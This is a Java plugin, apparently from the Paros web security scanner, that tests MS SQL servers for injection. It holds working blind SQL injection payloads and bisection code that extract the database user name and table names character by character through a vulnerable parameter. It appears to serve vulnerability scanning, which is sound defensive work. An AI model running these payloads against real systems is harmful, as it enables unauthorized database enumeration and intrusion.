package org.parosproxy.paros.core.scanner.plugin;

import java.io.IOException;
import org.apache.commons.httpclient.HttpException;
import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.network.HttpMessage;
import org.parosproxy.paros.network.HttpStatusCode;

public class TestInjectionMSSQLEnumeration extends AbstractAppParamPlugin {

    private static final String[] dependency = { "TestInjectionSQLFingerprint", "TestInjectionSQL" };

    private String mResBodyNormal = "";

    public int getId() {
        return 50002;
    }

    public String getName() {
        return "MS SQL Injection Enumeration";
    }

    public String[] getDependency() {
        return dependency;
    }

    public String getDescription() {
        String msg = "The DB user name or table name can be obtained.";
        return msg;
    }

    public int getCategory() {
        return Category.SQL_INJECTION;
    }

    public String getSolution() {
        String msg = "Refer SQL injection.";
        return msg;
    }

    public String getReference() {
        String msg = "Refer SQL injection.";
        return msg;
    }

    public void init() {
    }

    public void scan(HttpMessage baseMsg, String param, String value) {
        if (!getKb().getBoolean(baseMsg.getRequestHeader().getURI(), "sql/mssql")) {
            return;
        }
        if (getKb().getString("sql/mssql/username") != null && getKb().getString("sql/mssql/tablename") != null) {
            return;
        }
        try {
            scanSQL(baseMsg, param, value);
        } catch (Exception e) {
        }
    }

    public void scanSQL(HttpMessage baseMsg, String param, String value) throws HttpException, IOException {
        HttpMessage msg = getNewMsg();
        sendAndReceive(msg);
        if (msg.getResponseHeader().getStatusCode() != HttpStatusCode.OK) {
            return;
        }
        mResBodyNormal = msg.getResponseBody().toString();
        if (getKb().getBoolean(msg.getRequestHeader().getURI(), "sql/and")) {
            if (getKb().getString("sql/mssql/username") != null) {
                checkDBUserName(msg, param, value);
            }
            if (getKb().getString("sql/mssql/tablename") != null) {
                checkDBTableName(msg, param, value);
            }
        }
    }

    private void checkDBUserName(HttpMessage msg, String param, String value) throws HttpException, IOException {
        int charValue = 0;
        StringBuffer sb = new StringBuffer();
        byte[] byteArray = new byte[1];
        for (int i = 0; i < 20; i++) {
            charValue = 0;
            charValue = getDBUserNameBisection(msg, param, value, i, 47, 123);
            if (charValue == 47 || charValue == 123) {
                break;
            }
            byteArray[0] = (byte) charValue;
            String s = new String(byteArray, "UTF8");
            sb.append(s);
        }
        String result = sb.toString();
        if (result.length() > 0) {
            getKb().add("sql/mssql/username", result);
            bingo(Alert.RISK_HIGH, Alert.SUSPICIOUS, null, "", "db user name: " + result, msg);
        }
    }

    private int getDBUserNameBisection(HttpMessage msg, String param, String value, int charPos, int rangeLow, int rangeHigh) throws HttpException, IOException {
        if (rangeLow == rangeHigh) {
            return rangeLow;
        }
        int medium = (rangeLow + rangeHigh) / 2;
        boolean result = getDBUserNameQuery(msg, param, value, charPos, medium);
        if (rangeHigh - rangeLow < 2) {
            if (result) {
                return rangeHigh;
            } else {
                return rangeLow;
            }
        }
        if (result) {
            rangeLow = medium;
        } else {
            rangeHigh = medium;
        }
        int charResult = getDBUserNameBisection(msg, param, value, charPos, rangeLow, rangeHigh);
        return charResult;
    }

    private boolean getDBUserNameQuery(HttpMessage msg, String param, String value, int charPos, int charCode) throws HttpException, IOException {
        String s1 = "' AND ASCII(SUBSTRING(USER_NAME()," + (charPos + 1) + ",1))>" + charCode + " AND '1'='1";
        String resBodyAND = "";
        boolean is1 = false;
        setParameter(msg, param, value + getURLEncode(s1));
        sendAndReceive(msg);
        if (msg.getResponseHeader().getStatusCode() == HttpStatusCode.OK) {
            resBodyAND = stripOff(msg.getResponseBody().toString(), getURLEncode(s1));
            if (resBodyAND.compareTo(mResBodyNormal) == 0) {
                is1 = true;
            }
        }
        return is1;
    }

    private void checkDBTableName(HttpMessage msg, String param, String value) throws HttpException, IOException {
        int charValue = 0;
        StringBuffer sb = null;
        byte[] byteArray = new byte[1];
        for (int row = 1; row < 4; row++) {
            sb = new StringBuffer();
            for (int i = 0; i < 10; i++) {
                charValue = 0;
                charValue = getTableNameBisection(msg, param, value, i, 47, 123, row);
                if (charValue == 47 || charValue == 123) {
                    break;
                }
                byteArray[0] = (byte) charValue;
                String s = new String(byteArray, "UTF8");
                sb.append(s);
            }
            String result = sb.toString();
            if (result.length() > 0) {
                getKb().add("sql/mssql/tablename", result);
                bingo(Alert.RISK_HIGH, Alert.SUSPICIOUS, null, "", "table: " + result, msg);
            }
        }
    }

    private int getTableNameBisection(HttpMessage msg, String param, String value, int charPos, int rangeLow, int rangeHigh, int row) throws HttpException, IOException {
        if (rangeLow == rangeHigh) {
            return rangeLow;
        }
        int medium = (rangeLow + rangeHigh) / 2;
        boolean result = getTableNameQuery(msg, param, value, charPos, medium, row);
        if (rangeHigh - rangeLow < 2) {
            if (result) {
                return rangeHigh;
            } else {
                return rangeLow;
            }
        }
        if (result) {
            rangeLow = medium;
        } else {
            rangeHigh = medium;
        }
        int charResult = getTableNameBisection(msg, param, value, charPos, rangeLow, rangeHigh, row);
        return charResult;
    }

    private boolean getTableNameQuery(HttpMessage msg, String param, String value, int charPos, int charCode, int row) throws HttpException, IOException {
        String s1 = null;
        if (row == 1) {
            s1 = "' AND ascii(substring((SELECT TOP 1 name FROM sysobjects WHERE xtype='U' ORDER BY name)," + (charPos + 1) + ", 1))>" + charCode + " AND '1'='1";
        } else {
            s1 = "' AND ascii(substring((SELECT TOP 1 a.name FROM sysobjects as a WHERE a.xtype='U' AND a.name NOT IN(SELECT TOP " + (row - 1) + " b.name FROM sysobjects AS b WHERE b.xtype='U' order by b.name))," + (charPos + 1) + ", 1))>" + charCode + " AND '1'='1";
        }
        String resBodyAND = "";
        boolean is1 = false;
        setParameter(msg, param, value + getURLEncode(s1));
        sendAndReceive(msg);
        if (msg.getResponseHeader().getStatusCode() == HttpStatusCode.OK) {
            resBodyAND = stripOff(msg.getResponseBody().toString(), getURLEncode(s1));
            if (resBodyAND.compareTo(mResBodyNormal) == 0) {
                is1 = true;
            }
        }
        return is1;
    }
}
